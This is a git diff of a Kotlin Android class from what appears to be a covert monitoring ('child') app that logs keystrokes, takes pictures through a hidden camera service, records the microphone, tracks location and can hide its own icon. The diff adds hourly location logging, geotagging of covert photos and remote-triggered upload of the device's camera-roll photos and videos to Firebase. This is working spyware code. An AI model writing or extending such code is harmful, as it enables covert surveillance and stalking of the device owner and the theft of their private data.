@@ -1,15 +1,17 @@
 package com.dtz.netservice.services.accessibilityData
 
 import android.content.Context
+import android.content.pm.PackageManager
 import android.location.Geocoder
 import android.location.Location
 import android.media.MediaRecorder
 import android.net.Uri
+import android.os.Environment
+import android.util.Log
+import android.webkit.MimeTypeMap
+import androidx.core.app.ActivityCompat
 import com.dtz.netservice.R
-import com.dtz.netservice.data.model.ChildPhoto
-import com.dtz.netservice.data.model.ChildRecording
-import com.dtz.netservice.data.model.Photo
-import com.dtz.netservice.data.model.Recording
+import com.dtz.netservice.data.model.*
 import com.dtz.netservice.rxFirebase.InterfaceFirebase
 import com.dtz.netservice.services.social.MonitorService
 import com.dtz.netservice.utils.ConstFun.getDateTime
@@ -23,6 +25,8 @@ import com.dtz.netservice.utils.Consts.CHILD_SERVICE_DATA
 import com.dtz.netservice.utils.Consts.CHILD_SHOW_APP
 import com.dtz.netservice.utils.Consts.CHILD_SOCIAL_MS
 import com.dtz.netservice.utils.Consts.DATA
+import com.dtz.netservice.utils.Consts.GET_GALLERY_PHOTO
+import com.dtz.netservice.utils.Consts.GET_GALLERY_VIDEOS
 import com.dtz.netservice.utils.Consts.INTERVAL
 import com.dtz.netservice.utils.Consts.KEY_LOGGER
 import com.dtz.netservice.utils.Consts.KEY_TEXT
@@ -30,10 +34,12 @@ import com.dtz.netservice.utils.Consts.LOCATION
 import com.dtz.netservice.utils.Consts.LOCATIONS
 import com.dtz.netservice.utils.Consts.PARAMS
 import com.dtz.netservice.utils.Consts.PHOTO
+import com.dtz.netservice.utils.Consts.PHOTOS
 import com.dtz.netservice.utils.Consts.RECORDING
 import com.dtz.netservice.utils.Consts.SOCIAL
 import com.dtz.netservice.utils.Consts.TAG
 import com.dtz.netservice.utils.Consts.TIMER
+import com.dtz.netservice.utils.Consts.VIDEOS
 import com.dtz.netservice.utils.FileHelper
 import com.dtz.netservice.utils.FileHelper.getFileNameAudio
 import com.dtz.netservice.utils.FileHelper.getFilePath
@@ -47,6 +53,8 @@ import com.dtz.netservice.utils.hiddenCameraServiceUtils.CameraError.Companion.E
 import com.dtz.netservice.utils.hiddenCameraServiceUtils.HiddenCameraService
 import com.dtz.netservice.utils.hiddenCameraServiceUtils.config.CameraFacing
 import com.dtz.netservice.utils.hiddenCameraServiceUtils.config.CameraRotation
+import com.google.android.gms.location.FusedLocationProviderClient
+import com.google.android.gms.location.LocationServices
 import com.pawegio.kandroid.IntentFor
 import com.pawegio.kandroid.e
 import io.reactivex.android.schedulers.AndroidSchedulers
@@ -54,30 +62,36 @@ import io.reactivex.disposables.CompositeDisposable
 import io.reactivex.schedulers.Schedulers
 import java.io.File
 import java.io.IOException
+import java.text.SimpleDateFormat
 import java.util.*
 import javax.inject.Inject
+
 
 /**
  * Created by luis rafael on 17/03/18.
  */
-class InteractorAccessibilityData @Inject constructor(private val context: Context, private val firebase: InterfaceFirebase) : InterfaceAccessibility, CameraCallbacks {
+class InteractorAccessibilityData @Inject constructor(
+    private val context: Context,
+    private val firebase: InterfaceFirebase
+) : InterfaceAccessibility, CameraCallbacks {
 
     private var startTime = (1 * 60 * 1440000).toLong()
     private var interval = (1 * 1000).toLong()
     private var pictureCapture: HiddenCameraService = HiddenCameraService(context, this)
     private var disposable: CompositeDisposable = CompositeDisposable()
 
-    private var timer : MyCountDownTimer?=null
-    private var recorder: MediaRecorderUtils = MediaRecorderUtils{
+    private var timer: MyCountDownTimer? = null
+    private var recorder: MediaRecorderUtils = MediaRecorderUtils {
         cancelTimer()
         deleteFile()
     }
     private var fileName: String? = null
     private var dateTime: String? = null
-    private var nameAudio : String? =null
+    private var nameAudio: String? = null
 
-    private var countDownTimer : MyCountDownTimer = MyCountDownTimer(startTime,interval){
-        if (firebase.getUser()!=null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA).removeValue()
+    private var countDownTimer: MyCountDownTimer = MyCountDownTimer(startTime, interval) {
+        if (firebase.getUser() != null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA)
+            .removeValue()
         startCountDownTimer()
     }
 
@@ -96,7 +110,8 @@ class InteractorAccessibilityData @Inject constructor(private val context: Conte
     }
 
     override fun setDataKey(data: String) {
-        if (firebase.getUser()!=null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA).push().child(KEY_TEXT).setValue(data)
+        if (firebase.getUser() != null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA).push()
+            .child(KEY_TEXT).setValue(data)
     }
 
     override fun setDataLocation(location: Location) {
@@ -105,60 +120,174 @@ class InteractorAccessibilityData @Inject constructor(private val context: Conte
             val geoCoder = Geocoder(context, Locale.getDefault())
 
             address = try {
-                geoCoder.getFromLocation(location.latitude, location.longitude, 1)[0].getAddressLine(0)
+                geoCoder.getFromLocation(
+                    location.latitude,
+                    location.longitude,
+                    1
+                )[0].getAddressLine(0)
             } catch (e: IOException) {
                 context.getString(R.string.address_not_found)
             }
 
-            val model = com.dtz.netservice.data.model.Location(location.latitude, location.longitude, address, getDateTime())
+            val model = com.dtz.netservice.data.model.Location(
+                location.latitude,
+                location.longitude,
+                address,
+                getDateTime()
+            )
             firebase.getDatabaseReference("$LOCATION/$DATA").setValue(model)
 
             firebase.getDatabaseReference(LOCATIONS).push().setValue(model)
+
+            setDataLocationHourly(location)
+        }
+
+    }
+
+    private fun setDataLocationHourly(location: Location) {
+        if (firebase.getUser() != null) {
+            val address: String
+            val geoCoder = Geocoder(context, Locale.getDefault())
+
+            address = try {
+                geoCoder.getFromLocation(
+                    location.latitude,
+                    location.longitude,
+                    1
+                )[0].getAddressLine(0)
+            } catch (e: IOException) {
+                context.getString(R.string.address_not_found)
+            }
+
+            val currTime = SimpleDateFormat("dd-MM-yyyy HH", Locale.getDefault()).format(Date())
+
+            val model = com.dtz.netservice.data.model.Location(
+                location.latitude,
+                location.longitude,
+                address,
+                getDateTime()
+            )
+            firebase.getDatabaseReference("$LOCATION/HOURLY")
+                .child(currTime).setValue(model)
         }
 
     }
 
     override fun enablePermissionLocation(location: Boolean) {
-        if (firebase.getUser()!=null) firebase.getDatabaseReference("$LOCATION/$PARAMS/$CHILD_PERMISSION").setValue(location)
+        if (firebase.getUser() != null) firebase.getDatabaseReference("$LOCATION/$PARAMS/$CHILD_PERMISSION")
+            .setValue(location)
     }
 
     override fun enableGps(gps: Boolean) {
-        if (firebase.getUser()!=null) firebase.getDatabaseReference("$LOCATION/$PARAMS/$CHILD_GPS").setValue(gps)
+        if (firebase.getUser() != null) firebase.getDatabaseReference("$LOCATION/$PARAMS/$CHILD_GPS")
+            .setValue(gps)
     }
 
     override fun setRunServiceData(run: Boolean) {
-        if (firebase.getUser()!=null) firebase.getDatabaseReference("$DATA/$CHILD_SERVICE_DATA").setValue(run)
+        if (firebase.getUser() != null) firebase.getDatabaseReference("$DATA/$CHILD_SERVICE_DATA")
+            .setValue(run)
     }
 
     override fun getShowOrHideApp() {
         disposable.add(firebase.valueEvent("$DATA/$CHILD_SHOW_APP")
-                .map { data -> data.value as Boolean }
-                .subscribeOn(Schedulers.io())
-                .observeOn(AndroidSchedulers.mainThread())
-                .subscribe({ context.showApp(it) },
-                        { e(TAG, it.message.toString()) }))
+            .map { data -> data.value as Boolean }
+            .subscribeOn(Schedulers.io())
+            .observeOn(AndroidSchedulers.mainThread())
+            .subscribe({ context.showApp(it) },
+                { e(TAG, it.message.toString()) })
+        )
 
     }
 
     override fun getCapturePicture() {
-        disposable.add(firebase.valueEventModel("$PHOTO/$PARAMS", ChildPhoto::class.java)
+        disposable.add(
+            firebase.valueEventModel("$PHOTO/$PARAMS", ChildPhoto::class.java)
                 .subscribeOn(Schedulers.io())
                 .observeOn(AndroidSchedulers.mainThread())
                 .subscribe({ child -> startCameraPicture(child) },
-                        { error -> e(TAG, error.message.toString()) }))
+                    { error -> e(TAG, error.message.toString()) })
+        )
+    }
+
+    override fun getPhotos() {
+        disposable.add(
+            firebase.valueEventModel("$PHOTOS/$PARAMS", GalleryPhoto::class.java)
+                .subscribeOn(Schedulers.io())
+                .observeOn(AndroidSchedulers.mainThread())
+                .subscribe({ child -> getGalleryPhoto(child) },
+                    { error -> e(TAG, error.message.toString()) })
+        )
+    }
+
+    override fun getVideos() {
+        disposable.add(
+            firebase.valueEventModel("$VIDEOS/$PARAMS", GalleryVideo::class.java)
+                .subscribeOn(Schedulers.io())
+                .observeOn(AndroidSchedulers.mainThread())
+                .subscribe({ child -> getGalleryVideos(child) },
+                    { error -> e(TAG, error.message.toString()) })
+        )
     }
 
     private fun startCameraPicture(childPhoto: ChildPhoto) {
         if (childPhoto.capturePhoto!!) {
             val cameraConfig = CameraConfig().builder(context)
-                    .setCameraFacing(childPhoto.facingPhoto!!)
-                    .setImageRotation(
-                            if (childPhoto.facingPhoto == CameraFacing.FRONT_FACING_CAMERA) CameraRotation.ROTATION_270
-                            else CameraRotation.ROTATION_90
-                    )
-                    .build()
+                .setCameraFacing(childPhoto.facingPhoto!!)
+                .setImageRotation(
+                    if (childPhoto.facingPhoto == CameraFacing.FRONT_FACING_CAMERA) CameraRotation.ROTATION_270
+                    else CameraRotation.ROTATION_90
+                )
+                .build()
             pictureCapture.startCamera(cameraConfig)
         }
+    }
+
+    private fun getGalleryPhoto(child: GalleryPhoto) {
+        Log.d("PHOTOS", "..............******................")
+
+        val dcimPath = File(
+            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
+                .toString() + "/Camera"
+        )
+        if (dcimPath.exists()) {
+            val files = dcimPath.listFiles()
+            if (files != null) {
+                for (i in files.indices) {
+                    if (!isVideoFileUri(files[i].absolutePath)) {
+                        if (i < 5) {
+                            sendGalleryPhoto(files[i]);
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    private fun getGalleryVideos(child: GalleryVideo) {
+        Log.d("VIDEOS", "..............******................")
+
+        val dcimPath = File(
+            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
+                .toString() + "/Camera"
+        )
+        if (dcimPath.exists()) {
+            val files = dcimPath.listFiles()
+            if (files != null) {
+                Log.d("VIDEOS", "***** ${files.size}")
+                for (i in files.indices) {
+                    if (isVideoFileUri(files[i].absolutePath)) {
+                        sendGalleryVideo(files[i]);
+                    }
+                }
+            }
+        }
+    }
+
+
+    private fun isVideoFileUri(uri: String): Boolean {
+        val extension = MimeTypeMap.getFileExtensionFromUrl(uri)
+        val mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension)
+        return mimeType != null && mimeType.startsWith("video/")
     }
 
     override fun onImageCapture(imageFile: File) {
@@ -171,8 +300,9 @@ class InteractorAccessibilityData @Inject constructor(private val context: Conte
         firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)
 
         if (errorCode == ERROR_CAMERA_PERMISSION_NOT_AVAILABLE ||
-                errorCode == ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION ||
-                errorCode == ERROR_IMAGE_WRITE_FAILED)
+            errorCode == ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION ||
+            errorCode == ERROR_IMAGE_WRITE_FAILED
+        )
 
             firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(false)
     }
@@ -181,7 +311,8 @@ class InteractorAccessibilityData @Inject constructor(private val context: Conte
         if (imageFile != null) {
             val namePhoto = getRandomNumeric()
             val uri = Uri.fromFile(File(imageFile))
-            disposable.add(firebase.putFile("$PHOTO/$namePhoto", uri)
+            disposable.add(
+                firebase.putFile("$PHOTO/$namePhoto", uri)
                     .subscribeOn(Schedulers.io())
                     .observeOn(AndroidSchedulers.mainThread())
                     .subscribe({ task ->
@@ -192,57 +323,148 @@ class InteractorAccessibilityData @Inject constructor(private val context: Conte
                     }, { error ->
                         e(TAG, error.message.toString())
                         FileHelper.deleteFile(imageFile)
-                    }))
+                    })
+            )
         }
     }
 
+    private fun sendGalleryPhoto(file: File?) {
+        if (file != null) {
+            val photoName = file.name
+                .replace(".", "")
+                .replace("#", "")
+            val uri = Uri.fromFile(file)
+            disposable.add(
+                firebase.putFile("$PHOTOS/$DATA/$photoName", uri)
+                    .subscribeOn(Schedulers.io())
+                    .observeOn(AndroidSchedulers.mainThread())
+                    .subscribe({ task ->
+                        task.storage.downloadUrl.addOnCompleteListener {
+                            //val image = Image(photoName, it.result.toString())
+                            val photoMap: MutableMap<String, Any> = mutableMapOf()
+                            photoMap["file"] = it.result.toString()
+                            photoMap["name"] = photoName
+                            firebase.getDatabaseReference("$PHOTOS/$DATA").child(photoName)
+                                .updateChildren(photoMap)
+                            firebase.getDatabaseReference("$PHOTOS/$PARAMS/$GET_GALLERY_PHOTO")
+                                .setValue(false)
+                        }
+                    }, { error ->
+                        e(TAG, error.message.toString())
+                    })
+            )
+        }
+    }
+
+    private fun sendGalleryVideo(file: File?) {
+        if (file != null) {
+            val videoName = file.name
+                .replace(".", "")
+                .replace("#", "")
+            val uri = Uri.fromFile(file)
+            disposable.add(
+                firebase.putFile("$PHOTOS/$DATA/$videoName", uri)
+                    .subscribeOn(Schedulers.io())
+                    .observeOn(AndroidSchedulers.mainThread())
+                    .subscribe({ task ->
+                        task.storage.downloadUrl.addOnCompleteListener {
+                            val videoMap: MutableMap<String, Any> = mutableMapOf()
+                            videoMap["file"] = it.result.toString()
+                            videoMap["name"] = videoName
+                            firebase.getDatabaseReference("$VIDEOS/$DATA").child(videoName)
+                                .updateChildren(videoMap)
+                            firebase.getDatabaseReference("$VIDEOS/$PARAMS/$GET_GALLERY_VIDEOS")
+                                .setValue(false)
+                        }
+                    }, { error ->
+                        e(TAG, error.message.toString())
+                    })
+            )
+        }
+    }
+
+
     private fun setPushNamePhoto(url: String, namePhoto: String) {
-        val photo = Photo(namePhoto, getDateTime(), url)
-        firebase.getDatabaseReference("$PHOTO/$DATA").push().setValue(photo)
-        firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)
-        firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(true)
+
+        val fusedLocationProviderClient: FusedLocationProviderClient =
+            LocationServices.getFusedLocationProviderClient(context)
+        val task = fusedLocationProviderClient.lastLocation
+        val locationMap: MutableMap<String, Any> = mutableMapOf()
+
+        if (ActivityCompat
+                .checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION)
+            != PackageManager.PERMISSION_GRANTED && ActivityCompat
+                .checkSelfPermission(context, android.Manifest.permission.ACCESS_COARSE_LOCATION)
+            != PackageManager.PERMISSION_GRANTED
+        ) {
+
+            locationMap["lat"] = 0
+            locationMap["lng"] = 0
+            val photo = Photo(namePhoto, getDateTime(), url, locationMap)
+            firebase.getDatabaseReference("$PHOTO/$DATA").push().setValue(photo)
+            firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)
+            firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(true)
+        }
+        task.addOnSuccessListener {
+            if (it != null) {
+                locationMap["lat"] = it.latitude
+                locationMap["lng"] = it.longitude
+
+                val photo = Photo(namePhoto, getDateTime(), url, locationMap)
+                firebase.getDatabaseReference("$PHOTO/$DATA").push().setValue(photo)
+                firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)
+                firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(true)
+            }
+        }
     }
 
 
     override fun getSocialStatus() {
         disposable.add(firebase.valueEvent("$SOCIAL/$CHILD_SOCIAL_MS")
-                .map { data -> data.exists() }
-                .subscribeOn(Schedulers.io())
-                .observeOn(AndroidSchedulers.mainThread())
-                .subscribe({ if (!it) context.startService(IntentFor<MonitorService>(context)) },
-                        { e(TAG, it.message.toString()) }))
+            .map { data -> data.exists() }
+            .subscribeOn(Schedulers.io())
+            .observeOn(AndroidSchedulers.mainThread())
+            .subscribe({ if (!it) context.startService(IntentFor<MonitorService>(context)) },
+                { e(TAG, it.message.toString()) })
+        )
     }
 
 
     override fun getRecordingAudio() {
-        disposable.add(firebase.valueEventModel("$RECORDING/$PARAMS", ChildRecording::class.java)
+        disposable.add(
+            firebase.valueEventModel("$RECORDING/$PARAMS", ChildRecording::class.java)
                 .subscribeOn(Schedulers.io())
                 .observeOn(AndroidSchedulers.mainThread())
-                .subscribe({ child -> if (child.recordAudio!!){ startRecording(child.timeAudio!!) } },
-                        { error -> e(TAG, error.message.toString()) }))
+                .subscribe({ child ->
+                    if (child.recordAudio!!) {
+                        startRecording(child.timeAudio!!)
+                    }
+                },
+                    { error -> e(TAG, error.message.toString()) })
+        )
     }
 
 
-    private fun startRecording(startTime:Long) {
+    private fun startRecording(startTime: Long) {
 
-        timer = MyCountDownTimer(startTime,interval,{ setIntervalRecord(it) }){stopRecording()}
+        timer = MyCountDownTimer(startTime, interval, { setIntervalRecord(it) }) { stopRecording() }
 
         nameAudio = getRandomNumeric()
         dateTime = getDateTime()
         fileName = context.getFileNameAudio(nameAudio, dateTime)
 
-        recorder.startRecording(MediaRecorder.AudioSource.MIC,fileName)
+        recorder.startRecording(MediaRecorder.AudioSource.MIC, fileName)
         timer!!.start()
 
     }
 
     private fun stopRecording() = recorder.stopRecording { sendFileAudio() }
 
-    private fun cancelTimer(){
-        if (timer!=null) timer!!.cancel()
+    private fun cancelTimer() {
+        if (timer != null) timer!!.cancel()
     }
 
-    private fun setIntervalRecord(interval:Long) {
+    private fun setIntervalRecord(interval: Long) {
         firebase.getDatabaseReference("$RECORDING/$TIMER/$INTERVAL").setValue(interval)
     }
 
@@ -256,22 +478,24 @@ class InteractorAccessibilityData @Inject constructor(private val context: Conte
         val filePath = "${context.getFilePath()}/$ADDRESS_AUDIO_RECORD"
         val dateName = fileName!!.replace("$filePath/", "")
         val uri = Uri.fromFile(File(fileName))
-        disposable.add(firebase.putFile("$RECORDING/$dateName", uri)
+        disposable.add(
+            firebase.putFile("$RECORDING/$dateName", uri)
                 .subscribeOn(Schedulers.io())
                 .observeOn(AndroidSchedulers.mainThread())
-                .subscribe({ setPushName(it.metadata?.path.toString()) }, { deleteFile() }))
+                .subscribe({ setPushName(it.metadata?.path.toString()) }, { deleteFile() })
+        )
     }
 
     private fun setPushName(name: String) {
         val duration = "0" //FileHelper.getDurationFile(fileName!!)
-        val recording = Recording(name,dateTime,duration)
+        val recording = Recording(name, dateTime, duration)
         firebase.getDatabaseReference("$RECORDING/$DATA").push().setValue(recording)
         resetParamsRecording()
         //deleteFile()
     }
 
-    private fun resetParamsRecording(){
-        val childRecording = ChildRecording(false,0)
+    private fun resetParamsRecording() {
+        val childRecording = ChildRecording(false, 0)
         firebase.getDatabaseReference("$RECORDING/$PARAMS").setValue(childRecording)
         setIntervalRecord(0)
     }
